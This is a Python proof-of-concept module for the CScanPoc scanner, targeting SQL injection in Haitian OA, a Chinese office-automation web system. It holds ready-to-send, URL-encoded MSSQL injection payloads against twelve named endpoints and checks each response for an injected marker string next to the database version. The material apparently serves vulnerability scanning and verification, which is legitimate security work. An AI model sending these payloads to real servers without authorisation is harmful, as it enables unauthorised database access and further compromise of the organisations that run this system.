# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'HaitianOA_0011'  # 平台漏洞编号，留空
    name = '海天OA系统存在SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-02-11'  # 漏洞公布时间
    desc = '''
        海天网络协同办公系统(海天OA)，是一套高质量、高效率、智能化的基于B/S结构的办公系统。产品特色：图形化流程设计、电子印章及手写签名痕迹保留等功能、灵活的工作流处理模式支持、完善的角色权限管理 、严密的安全性管理 、完备的二次开发特性。
        海天OA系统多处存在GET型SQL注入漏洞：
        /PowerSelect.asp?FieldValue=1
        /Documents/FolderInfor.asp?POAID=1
        /Include/ChaXunDetail.asp?FID=-233
        /portal/index.asp?id=-233
        /information/OA_Condition.asp?subclass=1
        /Documents/FolderInfor.asp?OAID=1
        /meetingroom/MeetingRoom_UseInfo.asp?MeetingRoom=1
        /ZhuanTi/FolderDetails.asp?OAID=1
        /include/user/treedata.asp?bumenid=1
        /car/ShenQingInforDis.asp?OAID=1
        /flow/BiaoDanDangAn.asp?BiaoDanID=1
        /VO_EmailCaoGao.asp?StartDate=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=082899'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '海天OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6e14296f-6bfc-43a3-92b8-5229693cc054'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # GET型
            urls = [
                arg +
                '/PowerSelect.asp?FieldValue=1%27%20and%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version%20and%20%271%27=%271',
                arg +
                '/Documents/FolderInfor.asp?POAID=1%27%20and%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version%20and%20%271%27=%271',
                arg +
                '/Include/ChaXunDetail.asp?FID=-233%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg +
                '/portal/index.asp?id=-233%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version&returndata=true%20id=1',
                arg +
                '/information/OA_Condition.asp?subclass=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg +
                '/Documents/FolderInfor.asp?OAID=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg +
                '/meetingroom/MeetingRoom_UseInfo.asp?MeetingRoom=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg +
                '/ZhuanTi/FolderDetails.asp?OAID=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg +
                '/include/user/treedata.asp?bumenid=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version--',
                arg +
                '/car/ShenQingInforDis.asp?OAID=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg +
                '/flow/BiaoDanDangAn.asp?BiaoDanID=1%27%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version--',
                arg +
                '/VO_EmailCaoGao.asp?StartDate=1%27)%20or%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version%20)--',
            ]
            for url in urls:
                code, head, res, err, _ = hh.http(url)
                if ((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
